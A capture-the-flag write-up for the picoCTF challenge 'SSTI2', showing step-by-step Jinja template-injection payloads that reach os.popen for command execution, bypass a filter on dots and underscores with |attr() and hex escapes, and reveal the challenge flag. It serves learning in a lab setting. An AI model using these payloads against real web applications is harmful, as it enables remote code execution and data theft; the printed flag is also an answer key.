## SSTI2

[Link to challenge](https://play.picoctf.org/practice/challenge/488)

Write-up:

1. Taking a hint from the title, we are probably dealing with server-side template injection. 
Inputting "{{7*7}}" returns 49, which shows us code is executing.

2. This input allows us to list directories: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}`
<br> We get a message saying "Stop trying to break me". We need to get past the input sanitization.

3. Attempting to input all special characters in the payload helps us find out that "." and "_" chars are being filtered. 
   
4. Since we can't use dots, and __globals__ returns a dictionary-like object, we need to use __getitem__, which is an attribute of every Python object that supports item access.
`{{request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').popen('ls -R').read()}}` <br>
To replace the rest of the dots, we can use **|attr()**
`{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('ls -R')|attr('read')()}}`

5. To replace the underscores, we can hex-encode them:
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -R')|attr('read')()}}` <br>
This payload shows us the existence of a **flag** file.

6. `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}` <br>
Flag: picoCTF{sst1_f1lt3r_byp4ss_e964f71b}
